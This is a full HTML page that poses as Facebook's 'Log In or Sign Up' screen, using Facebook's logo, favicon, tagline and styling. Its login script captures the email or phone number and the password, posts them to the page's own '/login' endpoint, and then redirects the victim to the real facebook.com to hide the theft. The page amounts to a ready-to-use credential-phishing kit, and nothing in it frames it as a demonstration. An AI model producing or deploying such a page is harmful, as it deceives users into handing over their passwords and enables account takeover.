<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
    <style>
        body {
            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 980px;
            padding-bottom: 100px;
        }
        .left-col {
            width: 580px;
            padding-right: 32px;
        }
        .logo {
            height: 106px;
            margin: -28px;
        }
        h2 {
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            width: 500px;
            margin-top: 10px;
        }
        .card {
            background-color: #fff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            box-sizing: border-box;
            margin: 40px 0 0;
            padding: 20px 0 28px;
            width: 396px;
            text-align: center;
        }
        .form-container {
            padding: 0 16px;
        }
        input {
            font-size: 17px;
            padding: 14px 16px;
            width: 100%;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            margin-bottom: 12px;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 10px;
        }
        .btn:hover {
            background-color: #166fe5;
        }
        .forgot {
            color: #1877f2;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }
        .divider {
            align-items: center;
            border-bottom: 1px solid #dadde1;
            display: flex;
            margin: 20px 16px;
            text-align: center;
        }
        .create-btn {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            line-height: 48px;
            padding: 0 16px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            display: inline-block;
        }
        .create-btn:hover {
            background-color: #36a420;
        }
        @media (max-width: 900px) {
            .content {
                flex-direction: column;
                width: 100%;
                padding-top: 40px;
            }
            .left-col {
                text-align: center;
                width: auto;
                padding: 0;
                margin-bottom: 40px;
            }
            .logo {
                margin: 0;
                height: 60px;
            }
            h2 {
                font-size: 24px;
                width: auto;
            }
        }
    </style>
</head>
<body>
    <div class="content">
        <div class="left-col">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
            <h2>Facebook helps you connect and share with the people in your life.</h2>
        </div>
        
        <div class="card">
            <form id="login-form" class="form-container" onsubmit="handleLogin(event)">
                <input type="text" id="email" placeholder="Email address or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="btn">Log In</button>
                <a href="#" class="forgot">Forgotten password?</a>
                <div class="divider"></div>
                <button type="button" class="create-btn">Create new account</button>
            </form>
        </div>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: email, password: password})
            }).then(res => {
                window.location.href = "https://www.facebook.com/";
            });
        }
    </script>
</body>
</html>
